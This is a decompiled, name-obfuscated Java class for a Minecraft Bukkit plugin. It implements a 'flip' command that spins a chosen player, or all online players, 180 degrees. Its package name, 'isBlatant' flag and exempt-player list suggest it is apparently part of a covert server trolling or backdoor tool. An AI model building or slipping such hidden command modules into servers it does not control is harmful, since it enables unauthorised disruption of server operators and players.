/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.Location
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import java.util.concurrent.ExecutionException;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class FlipCommand
extends Command {
    public FlipCommand() {
        FlipCommand llllllllllllllIIllIlllIIllIIlIlI;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core llllllllllllllIIllIlllIIlIlllIlI, String llllllllllllllIIllIlllIIlIlllIIl, String[] llllllllllllllIIllIlllIIlIllIlIl, Player llllllllllllllIIllIlllIIlIllIlll) {
        if (llllllllllllllIIllIlllIIlIllIlIl.length <= 1) {
            llllllllllllllIIllIlllIIlIllIlll.sendMessage(Settings.USAGE("flip <player>"));
        } else if (llllllllllllllIIllIlllIIlIllIlIl[1].equals("*")) {
            for (Player llllllllllllllIIllIlllIIlIllllll : Bukkit.getOnlinePlayers()) {
                float llllllllllllllIIllIlllIIllIIIIIl;
                if (llllllllllllllIIllIlllIIlIllllll.getName().equals(llllllllllllllIIllIlllIIlIllIlll.getName()) || llllllllllllllIIllIlllIIlIlllIlI.lite.contains(llllllllllllllIIllIlllIIlIllllll.getName())) continue;
                Location llllllllllllllIIllIlllIIllIIIIII = llllllllllllllIIllIlllIIlIllllll.getLocation().clone();
                for (llllllllllllllIIllIlllIIllIIIIIl = llllllllllllllIIllIlllIIllIIIIII.getYaw() + 180.0f; llllllllllllllIIllIlllIIllIIIIIl < 0.0f; llllllllllllllIIllIlllIIllIIIIIl += 360.0f) {
                }
                while (llllllllllllllIIllIlllIIllIIIIIl > 360.0f) {
                    llllllllllllllIIllIlllIIllIIIIIl -= 360.0f;
                }
                llllllllllllllIIllIlllIIllIIIIII.setYaw(llllllllllllllIIllIlllIIllIIIIIl);
                llllllllllllllIIllIlllIIlIlllIlI.getServer().getScheduler().runTaskAsynchronously((Plugin)llllllllllllllIIllIlllIIlIlllIlI, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)llllllllllllllIIllIlllIIlIlllIlI, () -> llllllllllllllIIllIlllIIlIllllll.teleport(llllllllllllllIIllIlllIIllIIIIII)).get();
                    }
                    catch (InterruptedException | ExecutionException llllllllllllllIIllIlllIIlIIlIIll) {
                        // empty catch block
                    }
                });
            }
            llllllllllllllIIllIlllIIlIllIlll.sendMessage(Settings.PREFIX("All players were flipped!"));
        } else {
            Player llllllllllllllIIllIlllIIlIllllII = Bukkit.getServer().getPlayer(llllllllllllllIIllIlllIIlIllIlIl[1]);
            if (llllllllllllllIIllIlllIIlIllllII == null) {
                llllllllllllllIIllIlllIIlIllIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIllIlllIIlIllIlIl[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                float llllllllllllllIIllIlllIIlIlllllI;
                llllllllllllllIIllIlllIIlIllIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(llllllllllllllIIllIlllIIlIllllII.getName()).append(" was flipped!"))));
                Location llllllllllllllIIllIlllIIlIllllIl = llllllllllllllIIllIlllIIlIllllII.getLocation().clone();
                for (llllllllllllllIIllIlllIIlIlllllI = llllllllllllllIIllIlllIIlIllllIl.getYaw() + 180.0f; llllllllllllllIIllIlllIIlIlllllI < 0.0f; llllllllllllllIIllIlllIIlIlllllI += 360.0f) {
                }
                while (llllllllllllllIIllIlllIIlIlllllI > 360.0f) {
                    llllllllllllllIIllIlllIIlIlllllI -= 360.0f;
                }
                llllllllllllllIIllIlllIIlIllllIl.setYaw(llllllllllllllIIllIlllIIlIlllllI);
                llllllllllllllIIllIlllIIlIlllIlI.getServer().getScheduler().runTaskAsynchronously((Plugin)llllllllllllllIIllIlllIIlIlllIlI, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)llllllllllllllIIllIlllIIlIlllIlI, () -> llllllllllllllIIllIlllIIlIllllII.teleport(llllllllllllllIIllIlllIIlIllllIl)).get();
                    }
                    catch (InterruptedException | ExecutionException llllllllllllllIIllIlllIIlIlIIlII) {
                        // empty catch block
                    }
                });
            }
        }
    }
}

